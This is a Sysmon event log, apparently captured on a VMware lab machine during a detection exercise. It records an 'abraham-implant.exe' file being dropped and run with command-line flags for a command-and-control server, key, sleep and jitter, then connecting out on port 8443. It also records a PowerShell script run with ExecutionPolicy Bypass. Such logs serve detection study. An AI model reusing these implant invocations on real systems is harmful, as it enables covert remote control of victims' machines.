<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:52.1399111Z'/><EventRecordID>19</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:08:52.136</Data><Data Name='ProcessGuid'>{c4fe85a1-3884-6aa3-0903-000000000a00}</Data><Data Name='ProcessId'>8976</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='FileVersion'>152.0.4191.66</Data><Data Name='Description'>Microsoft Edge</Data><Data Name='Product'>Microsoft Edge</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>msedge.exe</Data><Data Name='CommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=crashpad-handler "--user-data-dir=C:\Users\antho\AppData\Local\Microsoft\Edge\User Data" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\antho\AppData\Local\Microsoft\Edge\User Data\Crashpad" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=152.0.7977.83 "--annotation=exe=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --annotation=plat=Win64 --annotation=prod=Edge --annotation=ver=152.0.4191.66 --initial-client-data=0x168,0x54,0x15c,0x164,0x24c,0x7ffc7d04e2a0,0x7ffc7d04e2b0,0x7ffc7d04e2c0</Data><Data Name='CurrentDirectory'>C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\</Data><Data Name='User'>Abraham\antho</Data><Data Name='LogonGuid'>{c4fe85a1-2a66-6aa3-5cf0-210000000000}</Data><Data Name='LogonId'>0x21f05c</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=37420AADF41F7DFE771A2B4BF5D4EDBA,SHA256=02AAED8823A4E4BAE8F672C620C9356BDDEBD68651D5BFD141ED9E6576D5F03C,IMPHASH=5CF043BE24821D48FE2001EA6C178A8F</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3884-6aa3-0803-000000000a00}</Data><Data Name='ParentProcessId'>3020</Data><Data Name='ParentImage'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --flag-switches-begin --flag-switches-end --no-startup-window</Data><Data Name='ParentUser'>Abraham\antho</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:52.0647864Z'/><EventRecordID>18</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:08:52.038</Data><Data Name='ProcessGuid'>{c4fe85a1-3884-6aa3-0803-000000000a00}</Data><Data Name='ProcessId'>3020</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='FileVersion'>152.0.4191.66</Data><Data Name='Description'>Microsoft Edge</Data><Data Name='Product'>Microsoft Edge</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>msedge.exe</Data><Data Name='CommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --flag-switches-begin --flag-switches-end --no-startup-window</Data><Data Name='CurrentDirectory'>C:\Program Files (x86)\Microsoft\Edge\Application\</Data><Data Name='User'>Abraham\antho</Data><Data Name='LogonGuid'>{c4fe85a1-2a66-6aa3-5cf0-210000000000}</Data><Data Name='LogonId'>0x21f05c</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=37420AADF41F7DFE771A2B4BF5D4EDBA,SHA256=02AAED8823A4E4BAE8F672C620C9356BDDEBD68651D5BFD141ED9E6576D5F03C,IMPHASH=5CF043BE24821D48FE2001EA6C178A8F</Data><Data Name='ParentProcessGuid'>{c4fe85a1-2a73-6aa3-0902-000000000a00}</Data><Data Name='ParentProcessId'>9896</Data><Data Name='ParentImage'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start</Data><Data Name='ParentUser'>Abraham\antho</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:16.9069588Z'/><EventRecordID>17</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>InvDB</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2026-09-10 23:08:16.906</Data><Data Name='ProcessGuid'>{c4fe85a1-26c9-6aa3-7600-000000000a00}</Data><Data Name='ProcessId'>5752</Data><Data Name='Image'>C:\WINDOWS\system32\svchost.exe</Data><Data Name='TargetObject'>HKU\S-1-5-21-2949513920-1191672773-928204500-1001\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\wt.exe</Data><Data Name='Details'>Binary Data</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>8</EventID><Version>2</Version><Level>4</Level><Task>8</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:14.8558248Z'/><EventRecordID>16</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:08:14.853</Data><Data Name='SourceProcessGuid'>{c4fe85a1-264c-6aa3-0900-000000000a00}</Data><Data Name='SourceProcessId'>740</Data><Data Name='SourceImage'>&lt;unknown process&gt;</Data><Data Name='TargetProcessGuid'>{c4fe85a1-3597-6aa3-c502-000000000a00}</Data><Data Name='TargetProcessId'>6072</Data><Data Name='TargetImage'>C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='NewThreadId'>4560</Data><Data Name='StartAddress'>0x00007FFCA9F96400</Data><Data Name='StartModule'>C:\WINDOWS\System32\KERNELBASE.dll</Data><Data Name='StartFunction'>CtrlRoutine</Data><Data Name='SourceUser'>NT AUTHORITY\SYSTEM</Data><Data Name='TargetUser'>Abraham\antho</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:13.1985506Z'/><EventRecordID>15</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:08:13.194</Data><Data Name='ProcessGuid'>{c4fe85a1-385d-6aa3-0603-000000000a00}</Data><Data Name='ProcessId'>7292</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='FileVersion'>10.0.26100.8737 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Services</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>svchost.exe</Data><Data Name='CommandLine'>C:\WINDOWS\System32\svchost.exe -k CameraMonitor</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{c4fe85a1-264c-6aa3-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=07FE1BE55D1049C7B48E270C466502D4,SHA256=1222A44A5FDB4EFDE4DFCB41093648627950E7EC02D8667F1C26CCAE31D922E2,IMPHASH=DE43BD45CC98C143357416C7519ECCFD</Data><Data Name='ParentProcessGuid'>{c4fe85a1-264c-6aa3-0b00-000000000a00}</Data><Data Name='ParentProcessId'>880</Data><Data Name='ParentImage'>C:\Windows\System32\services.exe</Data><Data Name='ParentCommandLine'>C:\WINDOWS\system32\services.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:06:12.8645892Z'/><EventRecordID>14</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='2868'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Usermode</Data><Data Name='UtcTime'>2026-09-10 23:06:11.504</Data><Data Name='ProcessGuid'>{c4fe85a1-37e3-6aa3-0403-000000000a00}</Data><Data Name='ProcessId'>2232</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='User'>Abraham\lab</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.162.128</Data><Data Name='SourceHostname'>Abraham.localdomain</Data><Data Name='SourcePort'>61000</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.162.1</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>8443</Data><Data Name='DestinationPortName'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:06:11.4694198Z'/><EventRecordID>13</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:06:11.466</Data><Data Name='ProcessGuid'>{c4fe85a1-37e3-6aa3-0403-000000000a00}</Data><Data Name='ProcessId'>2232</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>"C:\Users\antho\Desktop\abraham-implant.exe" "--server" "192.168.162.1:8443" "--key" "ae5ac1c402eb43b2ce38d61646e5e50dd3ee42ef894659734d4c1ee78d82086a" "--sleep" "3" "--jitter" "0.25" "-noWait" </Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-37e3-6aa3-884c-570000000000}</Data><Data Name='LogonId'>0x574c88</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=67E87634AC6A5EB282040953280ABC3A,SHA256=94ACCDC7F38F1DD200C518B3D4E0B5D583E03A81D1E11C997C6BF4C145D2B18C,IMPHASH=BD1B4A72C087AE9D7191680662901CDE</Data><Data Name='ParentProcessGuid'>{c4fe85a1-264f-6aa3-4200-000000000a00}</Data><Data Name='ParentProcessId'>3320</Data><Data Name='ParentImage'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:05:56.5993185Z'/><EventRecordID>12</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:05:56.598</Data><Data Name='ProcessGuid'>{c4fe85a1-37d4-6aa3-0203-000000000a00}</Data><Data Name='ProcessId'>8076</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:05:56.5538067Z'/><EventRecordID>11</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:05:56.547</Data><Data Name='ProcessGuid'>{c4fe85a1-37d4-6aa3-0203-000000000a00}</Data><Data Name='ProcessId'>8076</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>"C:\Users\antho\Desktop\abraham-implant.exe" "-server" "192.168.162.1:8443" "-key" "ae5ac1c402eb43b2ce38d61646e5e50dd3ee42ef894659734d4c1ee78d82086a" "-sleep" "3" "-jitter" "0.25" </Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-37d3-6aa3-d602-570000000000}</Data><Data Name='LogonId'>0x5702d6</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=67E87634AC6A5EB282040953280ABC3A,SHA256=94ACCDC7F38F1DD200C518B3D4E0B5D583E03A81D1E11C997C6BF4C145D2B18C,IMPHASH=BD1B4A72C087AE9D7191680662901CDE</Data><Data Name='ParentProcessGuid'>{c4fe85a1-264f-6aa3-4200-000000000a00}</Data><Data Name='ParentProcessId'>3320</Data><Data Name='ParentImage'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>2</EventID><Version>5</Version><Level>4</Level><Task>2</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:05:55.3227288Z'/><EventRecordID>10</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1099</Data><Data Name='UtcTime'>2026-09-10 23:05:55.321</Data><Data Name='ProcessGuid'>{c4fe85a1-264f-6aa3-4200-000000000a00}</Data><Data Name='ProcessId'>3320</Data><Data Name='Image'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='TargetFilename'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='CreationUtcTime'>2026-09-10 17:41:34.651</Data><Data Name='PreviousCreationUtcTime'>2026-09-10 23:05:54.794</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:05:54.7963332Z'/><EventRecordID>9</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>EXE</Data><Data Name='UtcTime'>2026-09-10 23:05:54.796</Data><Data Name='ProcessGuid'>{c4fe85a1-264f-6aa3-4200-000000000a00}</Data><Data Name='ProcessId'>3320</Data><Data Name='Image'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='TargetFilename'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='CreationUtcTime'>2026-09-10 23:05:54.794</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:05:37.9477440Z'/><EventRecordID>8</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:05:37.945</Data><Data Name='ProcessGuid'>{c4fe85a1-37c0-6aa3-ff02-000000000a00}</Data><Data Name='ProcessId'>7384</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\lab\AppData\Local\Temp\__PSScriptPolicyTest_uzxhfyyb.vbu.ps1</Data><Data Name='CreationUtcTime'>2026-09-10 23:05:37.945</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:05:36.5288219Z'/><EventRecordID>7</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:05:36.528</Data><Data Name='ProcessGuid'>{c4fe85a1-37c0-6aa3-ff02-000000000a00}</Data><Data Name='ProcessId'>7384</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\lab\AppData\Local\Temp\__PSScriptPolicyTest_lor3vuur.jzf.ps1</Data><Data Name='CreationUtcTime'>2026-09-10 23:05:36.526</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:05:36.3493669Z'/><EventRecordID>6</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:05:36.336</Data><Data Name='ProcessGuid'>{c4fe85a1-37c0-6aa3-ff02-000000000a00}</Data><Data Name='ProcessId'>7384</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.26100.9278 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-NoProfile" "-ExecutionPolicy" "Bypass" "-File" "C:\Users\Public\abraham-sysmon-check.ps1" </Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-37c0-6aa3-4a70-560000000000}</Data><Data Name='LogonId'>0x56704a</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=61F649A6FDC374A6BF36C860519E017C,SHA256=8BB6FA8C283B4D92120B1EF249A9B311B0F804D4CABBE9981159976C8BE76A5E,IMPHASH=2F87CE4617F593D7148B739BBF06D059</Data><Data Name='ParentProcessGuid'>{c4fe85a1-264f-6aa3-4200-000000000a00}</Data><Data Name='ParentProcessId'>3320</Data><Data Name='ParentImage'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:05:35.5987229Z'/><EventRecordID>5</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:05:35.597</Data><Data Name='ProcessGuid'>{c4fe85a1-264f-6aa3-4200-000000000a00}</Data><Data Name='ProcessId'>3320</Data><Data Name='Image'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='TargetFilename'>C:\Users\Public\abraham-sysmon-check.ps1</Data><Data Name='CreationUtcTime'>2026-09-10 23:05:35.597</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:05:12.6060480Z'/><EventRecordID>4</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:05:12.562</Data><Data Name='ProcessGuid'>{c4fe85a1-37a8-6aa3-fd02-000000000a00}</Data><Data Name='ProcessId'>2580</Data><Data Name='Image'>C:\Windows\System32\wbem\unsecapp.exe</Data><Data Name='FileVersion'>10.0.26100.9278 (WinBuild.160101.0800)</Data><Data Name='Description'>Sink to receive asynchronous callbacks for WMI client application</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>unsecapp.dll</Data><Data Name='CommandLine'>C:\WINDOWS\system32\wbem\unsecapp.exe -Embedding</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{c4fe85a1-264c-6aa3-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=50E17CFEF0E73A6EE0DC418FAA29FADB,SHA256=E74DE43BD3D3E99AC7C0E0C3D6E0DC6A81893CCFA007C5C766770F018AE40594,IMPHASH=9656E21ED232DDC034DE628B1E2968AD</Data><Data Name='ParentProcessGuid'>{c4fe85a1-264d-6aa3-0d00-000000000a00}</Data><Data Name='ParentProcessId'>372</Data><Data Name='ParentImage'>C:\Windows\System32\svchost.exe</Data><Data Name='ParentCommandLine'>C:\WINDOWS\system32\svchost.exe -k DcomLaunch -p</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:05:12.6056785Z'/><EventRecordID>3</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:05:12.475</Data><Data Name='ProcessGuid'>{c4fe85a1-37a8-6aa3-fc02-000000000a00}</Data><Data Name='ProcessId'>8800</Data><Data Name='Image'>C:\Windows\Sysmon64.exe</Data><Data Name='FileVersion'>15.22</Data><Data Name='Description'>System activity monitor</Data><Data Name='Product'>Sysinternals Sysmon</Data><Data Name='Company'>Sysinternals - www.sysinternals.com</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>C:\WINDOWS\Sysmon64.exe</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{c4fe85a1-264c-6aa3-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=0E7D569469CCE6B1E8A6415AED72C577,SHA256=83D31F2478DC6716CFDBF69E5C384BF043072B5F0D8D7B2EEA365F709FDA4352,IMPHASH=5C31CFDE3181A762CA91D21902DEF1B4</Data><Data Name='ParentProcessGuid'>{c4fe85a1-264c-6aa3-0b00-000000000a00}</Data><Data Name='ParentProcessId'>880</Data><Data Name='ParentImage'>C:\Windows\System32\services.exe</Data><Data Name='ParentCommandLine'>C:\WINDOWS\system32\services.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
